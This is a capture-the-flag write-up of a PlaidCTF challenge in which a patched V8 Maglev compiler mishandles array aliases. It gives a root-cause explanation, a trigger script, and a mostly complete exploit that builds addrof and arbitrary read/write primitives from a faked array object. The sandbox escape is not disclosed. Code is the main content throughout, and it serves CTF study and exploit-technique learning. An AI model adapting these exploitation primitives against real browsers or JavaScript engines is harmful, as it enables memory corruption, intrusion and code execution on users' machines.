# PlaidCTF

## RCA

The compiler lacks alias analysis, thus it treats an array with two names as two distinct arrays. Typically, it clears all known properties if a store operation occurs. However, the patch changes `kStore` to `kLoad`, preventing the compiler from clearing all known properties. Consequently, pushing with two aliases of an array results in reading the length from two different caches. This leads to a failure in expanding the elements array due to an incorrect length.

The vuln can be triggered by the following code:

```javascript
let cor_arr;
let arr = [];
let arr2 = arr;
function f() {
        arr2.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr.push(1.1);
        arr2.push(2.2);
        % DebugPrint(arr);
        % DebugPrint(cor_arr);
}
  
% PrepareFunctionForOptimization(f)
f();
f();
% OptimizeMaglevOnNextCall(f);
arr = [];
arr.push(1.1);
cor_arr=[1.1,2.2,3.3,4.4];
arr2=arr;

f();
```

Regarding the V8 sandbox escape method, I utilized a previously discovered technique. I may disclose it when possible. 

## POC

I will put the public version of the exploit here. The exploit strategy involves overwriting the elements of an object array with the address of a fake array object with an extraordinarily long length. This allows us to achieve the addrof and aar/w primitives through out-of-bounds read and write operations with the fake array.

```javascript
new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);
let fakeobj_arr = [3.79625217988789578926595419814E-311, 1.11253693094151915301246343349E-308, 3.3, 4.4];
let float_arr = [1.1, 2.2, 3.3, 4.4];
let obj_arr = [fakeobj_arr, fakeobj_arr];

new ArrayBuffer(0x7fe00000);
new ArrayBuffer(0x7fe00000);

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //

let cor_arr;
let arr = [];
let arr2 = arr;
function f() {
    cor_arr = [arr,arr];
    arr2.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr.push(1.1);
    arr2.push(7.7);
    arr2.push(1.11976954038269569130094751573E-307);
}
  
for (var i = 0; i < 0x1000; i++) {
    f();
}


arr = [];
arr.push(1.1);

arr2 = arr;
f();


let cor = cor_arr[0];

function aar(address) {
    cor[12] = helper.pair_i32_to_f64(address - 8, 0x80);
    return float_arr[0];
}

function aaw(address, value) {
    cor[12] = helper.pair_i32_to_f64(address - 8, 0x80);
    float_arr[0] = value;
}


function addrof(obj) {
    obj_arr[0] = obj;
    return helper.ftoil(cor[14]);
}
```
